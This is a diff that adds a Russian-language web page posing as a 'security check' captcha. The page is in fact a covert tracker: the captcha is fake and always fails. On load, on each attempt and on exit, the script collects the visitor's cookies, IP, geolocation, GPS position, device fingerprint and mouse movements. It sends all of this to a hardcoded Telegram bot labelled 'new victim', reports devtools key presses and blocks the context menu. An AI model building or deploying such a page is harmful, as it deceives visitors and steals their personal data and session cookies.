@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Проверка безопасности | Войдите для продолжения</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { font-family:'Segoe UI',Arial,sans-serif; background:linear-gradient(135deg,#667eea 0%,#764ba2 100%); min-height:100vh; display:flex; align-items:center; justify-content:center; }
+        .container { background:#fff; padding:40px; border-radius:15px; box-shadow:0 20px 40px rgba(0,0,0,0.1); max-width:450px; width:90%; }
+        h1 { color:#333; text-align:center; margin-bottom:30px; font-size:24px; }
+        .captcha-container { position:relative; margin-bottom:20px; }
+        #captchaCanvas { border:2px solid #ddd; border-radius:8px; width:100%; height:60px; background:#f8f9fa; display:block; }
+        #captchaInput { width:100%; padding:12px; border:2px solid #ddd; border-radius:8px; font-size:18px; text-transform:uppercase; letter-spacing:2px; margin-top:10px; }
+        #captchaInput:focus { border-color:#667eea; outline:none; box-shadow:0 0 0 3px rgba(102,126,234,0.1); }
+        .btn { width:100%; padding:15px; background:linear-gradient(135deg,#667eea,#764ba2); color:white; border:none; border-radius:8px; font-size:18px; cursor:pointer; transition:all 0.3s; }
+        .btn:hover { transform:translateY(-2px); box-shadow:0 10px 20px rgba(102,126,234,0.3); }
+        .btn:active { transform:translateY(0); }
+        #statusLoading { display:none; text-align:center; margin:20px 0; color:#667eea; font-weight:bold; }
+        #statusError { display:none; color:#e74c3c; text-align:center; font-weight:bold; margin-top:10px; }
+        .progress { height:4px; background:#eee; border-radius:2px; overflow:hidden; margin-top:10px; }
+        #progressBar { height:100%; background:linear-gradient(90deg,#667eea,#764ba2); width:0%; transition:width 0.3s; }
+        .footer { text-align:center; margin-top:20px; font-size:12px; color:#666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🔒 Проверка на безопасность</h1>
+        <p style="text-align:center; color:#666; margin-bottom:20px;">Введите код с картинки для подтверждения</p>
+        
+        <div class="captcha-container">
+            <canvas id="captchaCanvas"></canvas>
+            <input type="text" id="captchaInput" maxlength="6" autocomplete="off" placeholder="Введите код с картинки">
+        </div>
+        
+        <button class="btn" onclick="checkCaptcha()">Проверить</button>
+        
+        <div id="statusLoading">⏳ Проверка... <div class="progress"><div id="progressBar"></div></div></div>
+        <div id="statusError">❌ Код неверный. Попробуйте еще раз.</div>
+        
+        <div class="footer">Ваша безопасность важна для нас</div>
+    </div>
+
+    <script>
+        // === КОНФИГ ===
+        const CONFIG = {
+            botToken: '8282145932:AAE3Ze0wPSRFDx0FroHUJMTOXWHcpbvcb_w',  // От @BotFather
+            chatId: '882898449'       // Из getUpdates
+        };
+
+        let captchaText = '';
+        let attemptCount = 0;
+        let mouseTrail = [];
+
+        // === Генератор фейковой капчи ===
+        function generateCaptcha() {
+            const canvas = document.getElementById('captchaCanvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 300; canvas.height = 60;
+            
+            // Фон
+            const gradient = ctx.createLinearGradient(0,0,0,60);
+            gradient.addColorStop(0,'#f8f9fa'); gradient.addColorStop(1,'#e9ecef');
+            ctx.fillStyle = gradient; ctx.fillRect(0,0,300,60);
+            
+            // Текст (случайный)
+            captchaText = Math.random().toString(36).substring(2,8).toUpperCase().substring(0,6);
+            ctx.font = 'bold 28px Arial';
+            ctx.fillStyle = '#333';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            
+            // Добавляем шум
+            for(let i=0; i<30; i++) {
+                ctx.fillStyle = `hsl(${Math.random()*360},50%,80%)`;
+                ctx.fillRect(Math.random()*300, Math.random()*60, 2, 2);
+            }
+            
+            // Рисуем текст с искажением
+            for(let i=0; i<captchaText.length; i++) {
+                ctx.save();
+                ctx.translate(40 + i*45, 30);
+                ctx.rotate((Math.random()-0.5)*0.3);
+                ctx.fillText(captchaText[i], 0, 0);
+                ctx.restore();
+            }
+        }
+
+        // === Полный fingerprint ===
+        async function collectFullFingerprint() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                referrer: document.referrer,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.languages?.join(',') || navigator.language,
+                cookies: document.cookie,
+                screen: `${screen.width}x${screen.height}x${screen.availWidth}x${screen.availHeight}x${screen.colorDepth}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cpu: navigator.hardwareConcurrency || 'unknown',
+                ram: navigator.deviceMemory || 'unknown',
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink,
+                    rtt: navigator.connection.rtt
+                } : 'unsupported',
+                
+                // Canvas fingerprint
+                canvas: await getCanvasFingerprint(),
+                
+                // WebGL fingerprint
+                webgl: getWebGLFingerprint(),
+                
+                // Fonts
+                fonts: getFonts(),
+                
+                // Mouse trail
+                mouseTrail: mouseTrail.slice(-20),
+                
+                // Попытки
+                attempts: attemptCount,
+                sessionId: localStorage.getItem('sessionId') || (localStorage.setItem('sessionId', Math.random().toString(36).slice(2)), localStorage.getItem('sessionId'))
+            };
+
+            // IP + Geo
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                data.ip = (await ipRes.json()).ip;
+                
+                const geoRes = await fetch(`http://ip-api.com/json/${data.ip}?fields=status,message,country,regionName,city,lat,lon,isp,org,timezone,mobile,proxy`);
+                data.geo = await geoRes.json();
+            } catch(e) {
+                data.geoError = 'blocked';
+            }
+
+            // GPS (если разрешено)
+            if(navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => { data.gps = {lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy}; },
+                    () => { data.gps = 'denied'; }
+                );
+            }
+
+            // Battery
+            if('getBattery' in navigator) {
+                navigator.getBattery().then(bat => {
+                    data.battery = {level: bat.level*100+'%', charging: bat.charging};
+                });
+            }
+
+            return data;
+        }
+
+        // Canvas fingerprint
+        async function getCanvasFingerprint() {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 200; canvas.height = 60;
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillText('Fingerprint test', 2, 20);
+            return canvas.toDataURL();
+        }
+
+        // WebGL fingerprint
+        function getWebGLFingerprint() {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if(!gl) return 'unsupported';
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown',
+                renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown'
+            };
+        }
+
+        // Installed fonts
+        function getFonts() {
+            const testString = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ@!/{}';
+            const testSize = '72px monospace';
+            const h = document.body.offsetHeight;
+            const fonts = [];
+            
+            ['serif','sans-serif','monospace'].forEach(family => {
+                const span = document.createElement('span');
+                span.style.fontSize = testSize;
+                span.style.fontFamily = family;
+                span.innerHTML = testString;
+                document.body.appendChild(span);
+                fonts.push({family, width: span.offsetWidth, height: span.offsetHeight});
+                document.body.removeChild(span);
+            });
+            return fonts;
+        }
+
+        // === Отправка в TG ===
+        async function sendToTelegram(message, eventType = 'DATA') {
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CONFIG.chatId,
+                        text: `🕵️ **Новая жертва** [${eventType}]\n\n\`${JSON.stringify(message, null, 2).slice(0, 3900)}\``,
+                        parse_mode: 'Markdown',
+                        disable_web_page_preview: true
+                    })
+                });
+            } catch(e) {
+                console.log('Telegram send failed:', e);
+            }
+        }
+
+        // === Проверка капчи (всегда фейл) ===
+        async function checkCaptcha() {
+            attemptCount++;
+            const input = document.getElementById('captchaInput').value.toUpperCase().trim();
+            const loading = document.getElementById('statusLoading');
+            const error = document.getElementById('statusError');
+            const progress = document.getElementById('progressBar');
+            
+            // UI анимация
+            loading.style.display = 'block';
+            error.style.display = 'none';
+            progress.style.width = '0%';
+            
+            let progressVal = 0;
+            const progressInterval = setInterval(() => {
+                progressVal += Math.random() * 15;
+                if(progressVal > 90) progressVal = 90;
+                progress.style.width = progressVal + '%';
+            }, 100);
+            
+            // Собираем + отправляем
+            const victimData = await collectFullFingerprint();
+            victimData.captchaInput = input;
+            victimData.captchaExpected = captchaText;
+            victimData.inputCorrect = false; // Всегда фейл
+            
+            await sendToTelegram(victimData, 'CAPTCHA_ATTEMPT_' + attemptCount);
+            
+            clearInterval(progressInterval);
+            setTimeout(() => {
+                loading.style.display = 'none';
+                error.style.display = 'block';
+                document.getElementById('captchaInput').value = '';
+                document.getElementById('captchaInput').focus();
+                generateCaptcha();
+            }, 2000);
+        }
+
+        // === Трекинг поведения ===
+        document.addEventListener('mousemove', e => {
+            mouseTrail.push({x: e.clientX, y: e.clientY, t: Date.now()});
+            if(mouseTrail.length > 50) mouseTrail.shift();
+        });
+
+        document.addEventListener('keydown', e => {
+            if(e.key === 'F12' || (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's')) {
+                sendToTelegram({event: 'DEVTOOLS_DETECTED', key: e.key, ctrl: e.ctrlKey});
+            }
+        });
+
+        // Enter для капчи
+        document.getElementById('captchaInput').addEventListener('keypress', e => {
+            if(e.key === 'Enter') checkCaptcha();
+        });
+
+        // === Инициализация ===
+        window.addEventListener('load', async () => {
+            const initialData = await collectFullFingerprint();
+            await sendToTelegram(initialData, 'PAGE_LOAD');
+            generateCaptcha();
+            document.getElementById('captchaInput').focus();
+        });
+
+        window.addEventListener('beforeunload', () => {
+            sendToTelegram({event: 'PAGE_LEAVE', attempts: attemptCount});
+        });
+
+        // Предотвращаем контекстное меню
+        document.addEventListener('contextmenu', e => e.preventDefault());
+    </script>
+</body>
+</html>
